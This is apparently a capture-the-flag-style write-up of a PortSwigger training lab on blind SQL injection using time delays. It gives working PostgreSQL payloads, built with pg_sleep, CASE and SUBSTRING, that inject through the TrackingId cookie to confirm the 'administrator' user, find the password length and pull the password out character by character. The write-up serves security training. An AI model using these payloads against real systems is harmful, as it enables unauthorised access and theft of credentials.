
# Hi hackers, Today we will play this [LAB](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval)


This our WEBSITE
![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/afadf641-fa00-4849-a8b4-31122c5fda8c)

Let's go to burp tool

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/3ebf9ed5-c532-4f62-8aa8-35e9dc56ac1a)

```TrackingId=``` is vulnerable parameter.

This lab base on time delays , so we try this payload :

```'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END--```

![ezgif-1-da1900c2ff](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/de71e58b-cf45-4a07-8fbd-55e8253601a4)

WOow we got it !

we need to check from username is administrator we use this payload:

```'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--```

![ezgif-1-0913de0f0e](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/0014dd86-7ce1-4a3a-8151-04c065a61b56)

Woow now we know username is administrator but don't know the password 

### Let's go to know this, in first we need know length of password we will use this payload:

```'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>10)+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+FROM+users--```

![ezgif-1-2ee66f5ff7](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/4ef68bb6-502f-4d78-aec6-3744df1502ed)

Now We know that password of ```20 char```


### Ok great, Let's go to hack this password :) use this payload:

```'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+FROM+users--```

[Screencast from 2024-07-04 03:04:58 AM.webm](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/920e70f5-cac2-44d5-9f7b-d15101f1900d)

Good we will try again and again to discover 20 char

WOOW we can crack this password

















